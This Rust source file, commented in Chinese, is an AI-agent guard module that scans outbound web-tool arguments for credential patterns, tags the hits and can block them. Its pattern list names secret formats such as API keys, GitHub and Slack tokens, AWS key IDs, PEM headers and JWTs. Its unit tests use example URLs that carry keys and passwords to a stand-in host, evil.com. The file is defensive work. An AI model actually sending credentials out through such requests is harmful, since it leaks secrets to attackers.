// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 EvoRule Project
// This file is part of EvoRule, licensed under GNU Affero General Public License v3 or later.
//! `exfil_scan` —— 敏感数据外传模式打标：外传能力工具的凭据特征检测
//!
//! ## 威胁面（SG-3，family-① 敏感数据外传打标面）
//!
//! http_get 等外传能力工具的 args 是凭据外传载体：URL query（`?key=sk-…`）、
//! 请求头（`Authorization: Bearer …`）形态可携带 OpenAI/GitHub/AWS/Slack 等
//! 凭据出域。规则层为纯透传语义（零子串谓词纪律），凭据词形检测只能在
//! 应用采集侧完成——本模块在工具 args（脱敏前原文）上做词形扫描，命中打
//! `exfil_hits` 标记，server 侧治理规则资产以两条 enforce 锚消费：
//!
//! - **A1 事前锚**：enforce 态下构造 `set meta_security.pending_egress_intent`
//!   信号（value={tool_name, target?, exfil_hits}）提交进裁决会话，规则层
//!   enforce 拦截＝引擎丢弃指令不推进 version，agent 侧轮询 version 感知
//!   ＝blocked，工具不执行（fail-closed）；
//! - **A2 事后锚**：`tool_trace` 指令 params.value 带 `exfil_hits` 字段即被
//!   enforce 拒链（Violation 记账）——observe 态下执行照常、轨迹留痕。
//!
//! ## 三态开关（shell_net_guard 同纪律）
//!
//! env `EVORULE_EXFIL_GUARD` = `observe` | `enforce` | `off`，缺省 observe；
//! 非法值按 observe 处理 + warn（fail-open，配置错误不放大为可用性事故）：
//!
//! - **observe**（缺省）：命中照常执行＋轨迹打标（`exfil_hits`）——A2 锚
//!   enforce 拒链，Violation 留痕。执行了、账记下了（观察期形态）。
//! - **enforce**：命中即提交 A1 事前信号（与 R1/P2 共用裁决通道，不另设
//!   通道），blocked → 工具不执行，回喂 `blocked_by_governance_rule`；
//!   轨迹记 blocked 并照常打标。
//! - **off**：零开销直通，不扫描不打标。
//!
//! ## 判定语义
//!
//! 1. 词形表 [`EXFIL_PATTERNS`]（id, 词形）单一事实源：ASCII 大小写不敏感
//!    子串匹配 + 词边界护栏——命中位前一字符为 ASCII 字母数字时不算
//!    （防 `task-`/`risk-` 类词中误伤；`key=sk-abc` 的 `=`、URL 的 `/`
//!    分隔形态照常命中）；
//! 2. JWT 三段形（`eyJ` 起头且含两个 `.` 的 token 形态）按词形规则实现
//!    （[`EXFIL_JWT_SHAPE_ID`]）；
//! 3. 语义键检测：复用 `tool_trace::SENSITIVE_KEYS` 正本——args 对象中出现
//!    语义键且值为非空字符串 → 按 `sensitive_key:<键名>` 计入（键值绝不
//!    入标记）；
//! 4. 递归遍历 args 全部字符串（键名+值），命中去重后输出模式 ID 数组
//!    （`Vec<String>`，不含任何命中内容/键值）。
//!
//! ## 名单单一事实源
//!
//! 词形表与外传工具名单正本＝本文件 const（与 `shell_net_guard`/
//! `net_guard` 应用侧单一事实源先例同构）；server 侧规则资产为治理留痕
//! （enforce 消费 `exfil_hits` 打标，规则扩充零代码）。
//!
//! ## 边界注记
//!
//! - 外传工具名单取「宁窄勿错」：manifest 静态表实测唯 http_get 为直接
//!   网络外传面。call_service 是 runner 内部 io 通路（非工具面，内层工具
//!   经管道重入会双计）；shell_exec 的网络外传面由 SG-5 `shell_net_guard`
//!   既有管辖，凭据词形检测挂账后续批（避免双面治理叠加误伤）；
//!   批K 段2按同纪律扩容 web_fetch（URL 直接外传面）与 web_search（查询
//!   词出站面）——扩的是名单不是判据，词形检测零变化；
//! - `aws_akia`（裸 4 字母词形）与 `bearer_scheme`（词形含尾空格）在散文
//!   文本存在误伤可能——observe 缺省下仅多一条留痕，enforce 态手动开启时
//!   知悉；词边界护栏已排除词中形态（`Sakia`/`bearer.example.com`）；
//! - 事前信号 value 的 target 取 url authority 域（去 userinfo/port，
//!   host 形态不含凭据）——信号不携带任何命中内容。

use serde_json::Value;

/// 外传能力工具名单（外传面单一事实源；宁窄勿错，演化依据见模块边界注记）
///
/// 批K 段2扩容：web_fetch（直接外传面同 http_get——URL 携带凭据形态出域）
/// 与 web_search（查询词亦可携带凭据形态出域，且经 ai-plugin 中继为新增
/// 出站通道）。
/// 批K 段3：code_search 查询词为符号名子串（纯本地索引检索，零外发），
/// **不扩容**本名单——查询不出站，无凭据出域面。
/// 批K 段4：todo 双件为进程内内存态读写（会话任务清单，无任何出站面），
/// **不扩容**本名单。
pub const EXFIL_SCAN_TOOLS: &[&str] = &["http_get", "web_fetch", "web_search"];

/// 凭据特征模式表（id, 词形）。词形按 ASCII 小写匹配纪律存储（匹配大小写
/// 不敏感）；子串 + 词边界护栏（见 [`scan_text`]）。
pub const EXFIL_PATTERNS: &[(&str, &str)] = &[
    ("sk_prefix", "sk-"),                // OpenAI 系 API key 前缀
    ("github_ghp", "ghp_"),              // GitHub classic PAT
    ("github_gho", "gho_"),              // GitHub OAuth/token
    ("github_pat", "github_pat_"),       // GitHub fine-grained PAT
    ("aws_akia", "akia"),                // AWS access key id 前缀
    ("slack_xoxb", "xoxb-"),             // Slack bot token
    ("private_key_block", "-----begin"), // PEM 私钥块头（-----BEGIN …）
    ("bearer_scheme", "bearer "),        // Authorization: Bearer <token>
];

/// JWT 三段形词形的模式 ID（`eyJ` 起头且含两个 `.` 的 token 形态，
/// 按词形规则实现——非字面子串，见 [`scan_text`]）
pub const EXFIL_JWT_SHAPE_ID: &str = "jwt_shape";

/// JWT 词形头部（base64url 编码的 `{"` 固定前缀的词形特征）
const JWT_SHAPE_HEAD: &str = "eyJ";

/// 门禁模式（env `EVORULE_EXFIL_GUARD`）
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ExfilGuardMode {
    /// 观察：命中照常执行＋打标留痕（缺省）
    Observe,
    /// 强制：命中提交事前信号，blocked 即不执行（fail-closed）
    Enforce,
    /// 关闭：零开销直通，不扫描不打标
    Off,
}

impl ExfilGuardMode {
    /// env 解析；缺省 observe
    fn from_env() -> Self {
        Self::parse(std::env::var("EVORULE_EXFIL_GUARD").ok().as_deref())
    }

    /// 三态解析（纯函数，接线点 mode 注入式单测覆盖）；缺省 observe，
    /// 非法值按 observe + warn（fail-open，与 shell_net_guard/io_guard
    /// 同纪律）。
    fn parse(raw: Option<&str>) -> Self {
        match raw {
            Some(v) if v.eq_ignore_ascii_case("observe") => Self::Observe,
            Some(v) if v.eq_ignore_ascii_case("enforce") => Self::Enforce,
            Some(v) if v.eq_ignore_ascii_case("off") => Self::Off,
            Some(other) => {
                tracing::warn!(
                    target: "exfil_scan",
                    value = %other,
                    "EVORULE_EXFIL_GUARD 非法值，按 observe（纯观测）处理"
                );
                Self::Observe
            }
            None => Self::Observe,
        }
    }
}

/// 当前门禁模式（进程级一次解析）
pub fn guard_mode() -> ExfilGuardMode {
    static MODE: std::sync::OnceLock<ExfilGuardMode> = std::sync::OnceLock::new();
    *MODE.get_or_init(ExfilGuardMode::from_env)
}

/// 工具名单门控（外传能力面单一事实源查询）
pub fn exfil_scan_applies(tool_name: &str) -> bool {
    EXFIL_SCAN_TOOLS.contains(&tool_name)
}

/// ASCII 大小写不敏感子串定位（字节区间落在原文空间——词边界判定与
/// 后续掩蔽不换位）
fn find_ci(hay: &str, pat: &str) -> Option<usize> {
    if pat.is_empty() || pat.len() > hay.len() {
        return None;
    }
    let h = hay.as_bytes();
    let p = pat.as_bytes();
    (0..=h.len() - p.len()).find(|&i| {
        h[i..i + p.len()]
            .iter()
            .zip(p)
            .all(|(a, b)| a.eq_ignore_ascii_case(b))
    })
}

/// 词边界护栏：命中位前一字符存在且为 ASCII 字母数字 → 不算词形命中
fn word_boundary_ok(text: &str, start: usize) -> bool {
    text[..start]
        .chars()
        .next_back()
        .is_none_or(|c| !c.is_ascii_alphanumeric())
}

/// 单字符串词形扫描：返回（命中字节区间, 模式 ID）列表（按起点排序）
///
/// 词形表子串 + 词边界护栏；JWT 三段形按词形规则：`eyJ` 起头的 token
/// （至空白止）且含两个 `.`。
fn scan_text(text: &str) -> Vec<(std::ops::Range<usize>, &'static str)> {
    let mut out: Vec<(std::ops::Range<usize>, &'static str)> = Vec::new();
    for (id, pat) in EXFIL_PATTERNS {
        let mut from = 0usize;
        while let Some(rel) = find_ci(&text[from..], pat) {
            let start = from + rel;
            let end = start + pat.len();
            if word_boundary_ok(text, start) {
                out.push((start..end, id));
            }
            from = end;
        }
    }
    let mut from = 0usize;
    while let Some(rel) = find_ci(&text[from..], JWT_SHAPE_HEAD) {
        let start = from + rel;
        if word_boundary_ok(text, start) {
            let token_end = text[start..]
                .find(char::is_whitespace)
                .map_or(text.len(), |p| start + p);
            if text[start..token_end].matches('.').count() >= 2 {
                out.push((start..token_end, EXFIL_JWT_SHAPE_ID));
                from = token_end;
                continue;
            }
        }
        from = start + JWT_SHAPE_HEAD.len();
    }
    out.sort_by_key(|(r, _)| r.start);
    out
}

fn push_unique(hits: &mut Vec<String>, id: &str) {
    if !hits.iter().any(|h| h == id) {
        hits.push(id.to_string());
    }
}

fn push_text_hits(text: &str, hits: &mut Vec<String>) {
    for (_, id) in scan_text(text) {
        push_unique(hits, id);
    }
}

/// args 递归扫描（键名+值全遍历；语义键只认非空字符串值——键值不入标记）
fn collect_hits(v: &Value, hits: &mut Vec<String>) {
    match v {
        Value::Object(map) => {
            for (k, val) in map {
                push_text_hits(k, hits);
                if let Value::String(s) = val {
                    if !s.trim().is_empty() && crate::agent::tool_trace::is_sensitive_key(k) {
                        push_unique(hits, &format!("sensitive_key:{k}"));
                    }
                }
                collect_hits(val, hits);
            }
        }
        Value::Array(arr) => {
            for e in arr {
                collect_hits(e, hits);
            }
        }
        Value::String(s) => push_text_hits(s, hits),
        _ => {}
    }
}

/// 检测外传工具 args（脱敏/redact 之前**原文**）的敏感数据外传命中
///
/// 递归遍历全部字符串（键名+值），命中模式 → 模式 ID 数组（去重，首现
/// 序）；语义键命中按 `sensitive_key:<键名>` 计入。空返回＝无命中（采集
/// 层空结果不写字段——规则层 exists 语义：字段不存在=false）。
pub fn detect_exfil_hits(args: &Value) -> Vec<String> {
    let mut hits = Vec::new();
    collect_hits(args, &mut hits);
    hits
}

/// 外传目标提取（事前信号 value 的 target 字段；None＝缺省不带）
///
/// 取 `url` 参数的 authority 域（复用 shell_net_guard 提取纪律：去
/// userinfo/port/IPv6 括号）——host 形态不含凭据（凭据落在 exfil_hits
/// 打标），信号 value 不携带任何命中内容。
pub fn egress_target(args: &Value) -> Option<String> {
    let url = args.get("url").and_then(|v| v.as_str())?;
    super::shell_net_guard::extract_url_host(url)
}

/// 事前信号指令形态（纯函数）
///
/// 中性判据：`set meta_security.pending_egress_intent = <value>`。attr 为
/// 全新命名空间，与 `meta_tool.pending_tool_intent`（P2 通道）并存互不
/// 干扰；value={tool_name, target?, exfil_hits}——模式 ID 数组，不含任何
/// 命中内容/键值。被拦＝引擎丢弃指令不推进 version（裁决会话 blocked），
/// 放行＝内建 set 落状态。
pub fn egress_intent_signal(tool_name: &str, target: Option<&str>, exfil_hits: &[String]) -> Value {
    let mut value = serde_json::json!({
        "tool_name": tool_name,
        "exfil_hits": exfil_hits,
    });
    if let Some(t) = target {
        value["target"] = Value::from(t);
    }
    serde_json::json!({
        "type": "set",
        "params": {
            "attr": "meta_security.pending_egress_intent",
            "operation": "set",
            "value": value,
        }
    })
}

/// enforce 态事前信号装配（纯函数；接线点 mode 注入，三态分支由单测覆盖）
///
/// Enforce + 名单内 + 命中非空 → `Some((set 指令, 命中 ID 表))`；observe/
/// off、名单外、零命中一律 None（off/observe 零开销直通——打标归
/// tool_trace 采集层，本函数不承担留痕）。
pub fn egress_intent_submission(
    tool_name: &str,
    args: &Value,
    mode: ExfilGuardMode,
) -> Option<(Value, Vec<String>)> {
    if mode != ExfilGuardMode::Enforce || !exfil_scan_applies(tool_name) {
        return None;
    }
    let hits = detect_exfil_hits(args);
    if hits.is_empty() {
        return None;
    }
    let command = egress_intent_signal(tool_name, egress_target(args).as_deref(), &hits);
    Some((command, hits))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    /// 断言辅助：命中集合比对（去重后首现序依赖对象键序，集合语义断言）
    fn assert_hit_set(args: &Value, expected: &[&str]) {
        let mut got = detect_exfil_hits(args);
        got.sort();
        let mut want: Vec<String> = expected.iter().map(|s| s.to_string()).collect();
        want.sort();
        assert_eq!(got, want, "args={args}");
    }

    #[test]
    fn test_literal_pattern_hits() {
        // 词形表逐一命中（id 与词形一一对应）
        assert_hit_set(
            &json!({"url": "https://x/api?key=sk-abc123"}),
            &["sk_prefix"],
        );
        assert_hit_set(
            &json!({"url": "https://x?t=ghp_ABCDEF1234"}),
            &["github_ghp"],
        );
        assert_hit_set(
            &json!({"url": "https://x?t=gho_ABCDEF1234"}),
            &["github_gho"],
        );
        assert_hit_set(
            &json!({"url": "https://x?t=github_pat_ABCDEF1234"}),
            &["github_pat"],
        );
        assert_hit_set(
            &json!({"url": "https://hooks/x?t=xoxb-123456"}),
            &["slack_xoxb"],
        );
        assert_hit_set(
            &json!({"body": "-----BEGIN RSA PRIVATE KEY-----"}),
            &["private_key_block"],
        );
        // Authorization 是语义键：词形命中之外另计 sensitive_key（集合断言）
        assert_hit_set(
            &json!({"Authorization": "Bearer abc.def"}),
            &["bearer_scheme", "sensitive_key:Authorization"],
        );
    }

    #[test]
    fn test_akia_and_jwt_shape_hits() {
        assert_hit_set(
            &json!({"url": "https://x?k=AKIAIOSFODNN7EXAMPLE"}),
            &["aws_akia"],
        );
        // JWT 三段形：eyJ 起头 + 两个 '.' 的 token
        assert_hit_set(
            &json!({"url": "https://x?t=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.SflKxw"}),
            &["jwt_shape"],
        );
        // eyJ 起头但无两个 '.' → 不算 JWT 词形
        assert_hit_set(&json!({"url": "https://x?t=eyJhbGciOiJIUzI1NiJ9"}), &[]);
    }

    #[test]
    fn test_no_false_positives() {
        // 词中形态被词边界护栏排除（task-/risk-/mask-/desk-）
        assert_hit_set(&json!({"url": "https://x/task-123"}), &[]);
        assert_hit_set(&json!({"url": "https://x/risk-assessment"}), &[]);
        assert_hit_set(&json!({"body": "mask-value and desk-1"}), &[]);
        // 词中 akia / 词中 eyJ 起头不算（词边界护栏）
        assert_hit_set(&json!({"body": "Sakia and shakia"}), &[]);
        assert_hit_set(&json!({"body": "key=part_eyJxx.yy"}), &[]);
        // bearer 无尾随空格（词形含空格）不命中；普通 URL 零命中
        assert_hit_set(&json!({"body": "Bearer"}), &[]);
        assert_hit_set(&json!({"body": "bearer.example.com/x"}), &[]);
        assert_hit_set(&json!({"url": "https://example.com/data.json"}), &[]);
        // 非 JSON 字符串类型不入扫描
        assert_hit_set(&Value::Null, &[]);
        assert_hit_set(&json!({"n": 123, "b": true}), &[]);
    }

    #[test]
    fn test_boundary_separated_forms_hit() {
        // `=`/`/`/`:` 分隔的贴邻形态照常命中（词边界护栏只排字母数字贴邻）
        assert_hit_set(
            &json!({"url": "https://evil.com/sk-live-abc"}),
            &["sk_prefix"],
        );
        assert_hit_set(&json!({"body": "token: sk-abc"}), &["sk_prefix"]);
        assert_hit_set(&json!({"body": "X-Bearer: abc"}), &[]); // 无尾空格
    }

    #[test]
    fn test_sensitive_key_marking() {
        // 语义键 + 非空字符串值 → sensitive_key:<键名>；键值绝不入标记
        let args = json!({"api_key": "super-secret-value-123", "url": "https://x"});
        assert_hit_set(&args, &["sensitive_key:api_key"]);
        let serialized = detect_exfil_hits(&args).join(",");
        assert!(!serialized.contains("super-secret"), "标记不得携带键值");
        // 嵌套对象/数组语义键
        assert_hit_set(
            &json!({"headers": [{"token": "t-1"}, {"password": "p"}]}),
            &["sensitive_key:token", "sensitive_key:password"],
        );
        // 空值/空白值不标；非敏感键不标
        assert_hit_set(
            &json!({"api_key": "", "token": "   ", "note": "plain"}),
            &[],
        );
    }

    #[test]
    fn test_key_names_are_scanned_too() {
        // 键名本身也是扫描面（词形命中键名形态）
        assert_hit_set(&json!({"x-sk-note": "v"}), &["sk_prefix"]);
    }

    #[test]
    fn test_dedup_and_order_stability() {
        let args = json!({"url": "https://x?a=sk-1&b=sk-2&c=sk-3"});
        assert_hit_set(&args, &["sk_prefix"]);
        // 同输入重放一致
        assert_eq!(detect_exfil_hits(&args), detect_exfil_hits(&args));
    }

    #[test]
    fn test_mode_parse_three_states_and_invalid() {
        // 三态解析纯函数注入覆盖（guard_mode 为进程级单例不可逐值验证）
        assert_eq!(ExfilGuardMode::parse(None), ExfilGuardMode::Observe);
        assert_eq!(
            ExfilGuardMode::parse(Some("observe")),
            ExfilGuardMode::Observe
        );
        assert_eq!(
            ExfilGuardMode::parse(Some("OBSERVE")),
            ExfilGuardMode::Observe
        );
        assert_eq!(
            ExfilGuardMode::parse(Some("enforce")),
            ExfilGuardMode::Enforce
        );
        assert_eq!(
            ExfilGuardMode::parse(Some("Enforce")),
            ExfilGuardMode::Enforce
        );
        assert_eq!(ExfilGuardMode::parse(Some("off")), ExfilGuardMode::Off);
        assert_eq!(ExfilGuardMode::parse(Some("OFF")), ExfilGuardMode::Off);
        // 非法值 fail-open 按 observe（warn 留痕）
        assert_eq!(
            ExfilGuardMode::parse(Some("bogus")),
            ExfilGuardMode::Observe
        );
        assert_eq!(ExfilGuardMode::parse(Some("")), ExfilGuardMode::Observe);
    }

    #[test]
    fn test_tool_gating() {
        assert!(exfil_scan_applies("http_get"));
        assert!(!exfil_scan_applies("shell_exec"));
        assert!(!exfil_scan_applies("file_write"));
        assert!(!exfil_scan_applies(""));
        assert!(EXFIL_SCAN_TOOLS.contains(&"http_get"));
        // 批K 段2扩容锚
        assert!(EXFIL_SCAN_TOOLS.contains(&"web_fetch"));
        assert!(EXFIL_SCAN_TOOLS.contains(&"web_search"));
    }

    #[test]
    fn test_egress_target_extracts_host_only() {
        // host 提取：userinfo/port 去除（凭据不落 target）
        let args = json!({"url": "https://user:pass@Evil.com:8443/x?key=sk-abc"});
        assert_eq!(egress_target(&args).as_deref(), Some("evil.com"));
        // 无 url / 非 :// 形态 → None（信号缺省不带 target）
        assert_eq!(egress_target(&json!({})), None);
        assert_eq!(egress_target(&json!({"url": "not-a-url"})), None);
    }

    #[test]
    fn test_egress_intent_signal_shape() {
        let cmd = egress_intent_signal(
            "http_get",
            Some("evil.com"),
            &["sk_prefix".to_string(), "jwt_shape".to_string()],
        );
        assert_eq!(cmd["type"], "set");
        assert_eq!(cmd["params"]["attr"], "meta_security.pending_egress_intent");
        assert_eq!(cmd["params"]["operation"], "set");
        assert_eq!(cmd["params"]["value"]["tool_name"], "http_get");
        assert_eq!(cmd["params"]["value"]["target"], "evil.com");
        assert_eq!(
            cmd["params"]["value"]["exfil_hits"],
            json!(["sk_prefix", "jwt_shape"])
        );
        // target 缺省不带（None → 字段不存在）
        let cmd2 = egress_intent_signal("http_get", None, &["sk_prefix".to_string()]);
        assert!(cmd2["params"]["value"].get("target").is_none());
    }

    #[test]
    fn test_egress_intent_submission_three_modes_and_gating() {
        let args = json!({"url": "https://evil.com/x?key=sk-abc123"});
        // enforce + 名单内 + 命中 → Some（指令形态 + 命中表）
        let (cmd, hits) = egress_intent_submission("http_get", &args, ExfilGuardMode::Enforce)
            .expect("enforce+hit must submit");
        assert_eq!(cmd["params"]["attr"], "meta_security.pending_egress_intent");
        assert_eq!(hits, vec!["sk_prefix".to_string()]);
        assert_eq!(cmd["params"]["value"]["target"], "evil.com");
        // observe/off → None（零开销直通）
        assert!(egress_intent_submission("http_get", &args, ExfilGuardMode::Observe).is_none());
        assert!(egress_intent_submission("http_get", &args, ExfilGuardMode::Off).is_none());
        // 名单外 enforce → None
        let shell_args = json!({"command": "echo sk-abc"});
        assert!(
            egress_intent_submission("shell_exec", &shell_args, ExfilGuardMode::Enforce).is_none()
        );
        // enforce + 零命中 → None
        assert!(egress_intent_submission(
            "http_get",
            &json!({"url": "https://example.com/"}),
            ExfilGuardMode::Enforce
        )
        .is_none());
    }

    #[test]
    fn test_submission_value_carries_no_hit_content() {
        // 信号 value 全文不得含命中内容（凭据原文不入裁决会话）
        let args = json!({
            "url": "https://user:pass@evil.com/?key=sk-SUPERSECRET123",
            "Authorization": "Bearer abc.def.ghi",
        });
        let (cmd, _) =
            egress_intent_submission("http_get", &args, ExfilGuardMode::Enforce).unwrap();
        let raw = cmd.to_string();
        assert!(!raw.contains("SUPERSECRET"), "凭据原文不得入信号: {raw}");
        assert!(!raw.contains("user:pass"), "userinfo 不得入信号: {raw}");
        assert!(!raw.contains("abc.def.ghi"), "命中内容不得入信号: {raw}");
    }
}
